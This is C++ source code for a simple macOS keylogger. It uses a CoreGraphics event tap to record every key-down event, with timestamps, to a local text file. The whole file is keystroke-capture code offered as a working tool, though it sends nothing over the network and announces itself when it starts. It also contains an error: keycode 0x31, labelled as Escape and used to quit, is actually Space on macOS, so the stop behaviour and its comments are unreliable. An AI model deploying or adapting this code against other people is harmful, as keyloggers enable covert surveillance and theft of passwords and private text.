#include <ApplicationServices/ApplicationServices.h>
#include <iostream>
#include <fstream>
#include <ctime>

// File to save key log
const char* logFile = "key_log.txt";

// Function to log the key to a file
void logKey(const std::string& key) {
    std::ofstream file(logFile, std::ios::app); // Append mode
    if (file.is_open()) {
        // Get current time
        time_t now = time(0);
        char* dt = ctime(&now);

        // Write the timestamp and key to the file
        file << "[" << dt << "] " << key << std::endl;
        file.close();
    } else {
        std::cerr << "Unable to open log file." << std::endl;
    }
}

// Callback function for when a key is pressed
CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
    if (type == kCGEventKeyDown) {
        // Get the key code
        CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

        // Map keycodes to strings
        switch (keycode) {
            case 0x31: // Esc key
                logKey("Escape");
                // Exit the program if 'Esc' is pressed
                exit(0);
                break;
            case 0x24: // Enter key
                logKey("Enter");
                break;
            case 0x30: // Tab key
                logKey("Tab");
                break;
            case 0x33: // Backspace key
                logKey("Backspace");
                break;
            default: // Other keys (we'll print the keycode for simplicity)
                logKey("Key code: " + std::to_string(keycode));
                break;
        }
    }
    return event;
}

int main() {
    // Request privileges to monitor keyboard events (will need Accessibility permissions)
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, keyCallback, NULL);

    if (!eventTap) {
        std::cerr << "Failed to create event tap." << std::endl;
        exit(1);
    }

    // Create a run loop source and add it to the current run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    // Start capturing key events
    std::cout << "Keylogger started. Press 'Esc' to stop." << std::endl;
    CFRunLoopRun(); // Start the run loop to capture events

    // Clean up (won't actually be reached unless you change exit conditions)
    CFRelease(runLoopSource);
    CFRelease(eventTap);

    return 0;
}